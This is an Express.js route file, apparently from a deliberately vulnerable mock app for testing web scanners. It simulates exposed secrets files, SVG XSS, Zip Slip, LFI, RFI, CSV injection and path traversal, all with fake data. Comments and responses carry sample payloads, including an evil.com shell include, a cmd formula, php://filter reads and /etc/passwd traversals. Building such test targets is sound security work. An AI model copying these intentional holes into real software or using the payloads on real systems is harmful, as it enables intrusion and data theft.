const express = require('express');
const path = require('path');
const { escHtml, mark } = require('../lib/utils');
const router = express.Router();

// Güncel dosya/ifşa yüzeyi: backup, source-map, swagger, actuator, svg, zip-slip, LFI/RFI, CSV.
// DAST'lerin forced-browse + content-check özellikleri bunlarla ölçülür. Gerçek dosya okuma YOK, mock içerik.

// ---------- Bilgi ifşası dosyaları ----------
router.get('/.env', (req, res) => {
  mark(res, 'EXP-ENV-01', 'A05-Exposure', 'vulnerable');
  res.type('text/plain').send('APP_ENV=production\nDB_HOST=db-internal.example.com\nDB_PASSWORD=Sup3rS3cret!\nAWS_ACCESS_KEY_ID=AKIA-MOCK-EXAMPLE\nAWS_SECRET_ACCESS_KEY=mock-secret-key-123\nSTRIPE_SECRET_KEY=sk_live_mock_123');
});
router.get('/backup.bak', (req, res) => {
  mark(res, 'EXP-BAK-01', 'A05-Exposure', 'vulnerable');
  res.type('text/plain').send("-- mock SQL dump\nINSERT INTO users VALUES (99,'admin','5f4dcc3b5aa765d61d8327deb882cf99');\n-- DB_PASSWORD=Sup3rS3cret!");
});
router.get('/db.sql.bak', (req, res) => {
  mark(res, 'EXP-BAK-01', 'A05-Exposure', 'vulnerable');
  res.type('text/plain').send('-- mock backup\nalice@example.com:$2y$10$mockhash...');
});
router.get('/.DS_Store', (req, res) => {
  mark(res, 'EXP-DS-01', 'A05-Exposure', 'vulnerable');
  res.type('text/plain').send('mock DS_Store listing:\nadmin.php\n.env\nbackup.bak\ninternal-api/');
});
router.get('/app.js.map', (req, res) => {
  mark(res, 'EXP-MAP-01', 'A05-Exposure', 'vulnerable');
  res.json({ version: 3, sources: ['webpack://app/src/config.js'], sourcesContent: ['const STRIPE_KEY="sk_live_mock_123"; // source-map ile sızdı'], mappings: 'mock' });
});
router.get('/swagger.json', (req, res) => {
  mark(res, 'EXP-SWAG-01', 'A05-Exposure', 'vulnerable');
  res.json({ openapi: '3.0.0', info: { title: 'Internal API (gizli olmalıydı)' }, paths: { '/admin/users': {}, '/internal/export': {} }, components: { securitySchemes: { bearer: { example: 'Bearer MOCKTOKEN' } } } });
});
router.get('/actuator', (req, res) => {
  mark(res, 'EXP-ACT-01', 'A05-Exposure', 'vulnerable');
  res.json({ env: { 'DB_PASSWORD': 'Sup3rS3cret!', 'spring.datasource.url': 'jdbc:postgresql://db-internal:5432/app' }, note: 'Spring actuator açık (mock)' });
});
router.get('/robots.txt', (req, res) => {
  mark(res, 'EXP-ROBOTS-01', 'A05-Exposure', 'vulnerable');
  res.type('text/plain').send('User-agent: *\nDisallow: /admin\nDisallow: /backup.bak\nDisallow: /internal-api\nDisallow: /actuator');
});

// ---------- SVG upload XSS (VULN) ----------
let lastSvg = null;
router.post('/svg', express.text({ type: '*/*', limit: '500kb' }), (req, res) => {
  const fname = req.get('X-Filename') || 'logo.svg';
  mark(res, 'FILE-SVG-01', 'A04-FileHandling', 'vulnerable');
  lastSvg = String(req.body || '');
  const exec = /<script|onload\s*=|onerror\s*=/i.test(lastSvg);
  res.send(`<h1>Yüklendi: /uploads/${escHtml(fname)}</h1><p>SVG aynen saklandı, <code>image/svg+xml</code> ile sunuluyor. ${exec ? 'İçinde script/event handler var — açılınca çalışır!' : ''}</p><p><a href="/files/rendered.svg">/files/rendered.svg</a> ile görüntüle</p>`);
});
router.get('/rendered.svg', (req, res) => {
  mark(res, 'FILE-SVG-01', 'A04-FileHandling', 'vulnerable');
  res.type('image/svg+xml').send(lastSvg || '<svg xmlns="http://www.w3.org/2000/svg"><text>boş</text></svg>');
});
router.post('/svg-secure', express.text({ type: '*/*', limit: '500kb' }), (req, res) => {
  mark(res, 'FILE-SVG-01-SECURE', 'A04-FileHandling', 'secure');
  const fname = req.get('X-Filename') || 'a.png';
  if (!/\.(png|jpe?g)$/i.test(fname)) return res.status(415).send('SVG yasak: sadece png/jpg, rasterize + Content-Disposition: attachment');
  res.send('yüklendi (rasterize mock)');
});

// ---------- Zip Slip (VULN mock) ----------
router.post('/unzip', (req, res) => {
  mark(res, 'FILE-ZIP-01', 'A04-FileHandling', 'vulnerable');
  const { filename = 'a.txt' } = req.body || {};
  if (String(filename).includes('../')) return res.send(`<h1>Çıkarıldı!</h1><p>/app/uploads/${escHtml(filename)} → path dışına yazıldı (Zip Slip mock!)</p>`);
  res.send(`<h1>Çıkarıldı</h1><p>/app/uploads/${escHtml(filename)}</p>`);
});

// ---------- LFI (VULN mock) ----------
router.get('/view', (req, res) => {
  const t = req.query.template ?? 'home';
  mark(res, 'FILE-LFI-01', 'A04-FileHandling', 'vulnerable');
  const s = String(t);
  if (s.includes('../') || s.includes('php://filter') || s.toLowerCase().includes('/etc/passwd')) {
    return res.type('text/plain').send(`root:x:0:0:root:/root:/bin/bash\n[mock LFI: ${s}]`);
  }
  res.send(`<h1>Sayfa: ${escHtml(t)}</h1>`);
});
router.get('/view-secure', (req, res) => {
  const t = String(req.query.template ?? 'home');
  mark(res, 'FILE-LFI-01-SECURE', 'A04-FileHandling', 'secure');
  if (!['home', 'about', 'contact'].includes(path.basename(t))) return res.status(400).send('allowlist dışı şablon');
  res.send(`<h1>Sayfa: ${escHtml(t)}</h1>`);
});

// ---------- RFI (VULN mock — gerçek outbound YOK) ----------
router.get('/page', (req, res) => {
  const u = req.query.url ?? '';
  mark(res, 'FILE-RFI-01', 'A04-FileHandling', 'vulnerable');
  if (/^https?:\/\//i.test(String(u))) return res.send(`<h1>Include edildi (mock)</h1><p>Remote <code>${escHtml(u)}</code> çekilip çalıştırıldı — outbound loglandı, gerçek fetch YOK.</p>`);
  res.send('<h1>Sayfa</h1><p>?url=https://evil.com/shell.txt dene</p>');
});

// ---------- CSV formula injection (VULN) ----------
router.get('/export.csv', (req, res) => {
  const user = req.query.user ?? 'alice';
  mark(res, 'FILE-CSV-01', 'A04-FileHandling', 'vulnerable');
  res.type('text/csv').set('Content-Disposition', 'attachment; filename="export.csv"');
  res.send(`id,username,balance\n1,${user},12500\n`); // =cmd|' /C calc'!A0 sanitize edilmeden gömülür
});

// ---------- LFI wrapper'ları (php://filter, data://, expect://, zip:// mock) ----------
router.get('/include', (req, res) => {
  const mod = String(req.query.mod ?? 'home');
  mark(res, 'FILE-WRAP-01', 'A04-FileHandling', 'vulnerable');
  const low = mod.toLowerCase();
  if (low.startsWith('php://filter')) {
    return res.type('text/plain').send('PD9waHAgJGRiX3Bhc3M9IlN1cDNyUzNjcmV0ISI7ID8+  [php://filter base64(mock): <?php $db_pass="Sup3rS3cret!"; ?>]');
  }
  if (low.startsWith('data://')) {
    return res.send(`<h1>Include (mock)</h1><p>data:// wrapper çalıştırıldı: <code>${escHtml(mod.slice(0, 80))}</code></p>`);
  }
  if (low.startsWith('expect://') || low.startsWith('zip://') || low.startsWith('phar://')) {
    return res.type('text/plain').send(`uid=33(www-data) [${low.split(':')[0]} wrapper mock çıktısı]`);
  }
  if (mod.includes('../')) return res.type('text/plain').send('root:x:0:0:root:/root:/bin/bash [LFI mock]');
  res.send(`<h1>Modül: ${escHtml(mod)}</h1><p>?mod=php://filter/convert.base64-encode/resource=config dene</p>`);
});

// ---------- Unicode/overlong traversal + ADS ----------
router.get('/download', (req, res) => {
  const f = String(req.query.file ?? 'rapor.pdf');
  mark(res, 'FILE-UNI-01', 'A04-FileHandling', 'vulnerable');
  if (/%c0%ae|%c1%9c|%252e|\.\.[\/\\]|::\$data|%00/i.test(f)) {
    const base = f.split('/').pop().split('\\').pop().replace(/%c0%ae/gi, '..').replace(/::$data/i, '');
    if (/secret|passwd|\\.env/i.test(base)) {
      return res.type('text/plain').send('root:x:0:0:root:/root:/bin/bash\nDB_PASSWORD=Sup3rS3cret! [normalizasyon öncesi kontrol mock]');
    }
    return res.type('text/plain').send(`[mock dosya: ${base}] içerik...`);
  }
  res.type('text/plain').send(`[mock dosya: ${f}]`);
  // ?file=%c0%ae%c0%ae/secrets.txt , ?file=....//....//etc/passwd , ?file=not.txt::$DATA dene
});

module.exports = router;
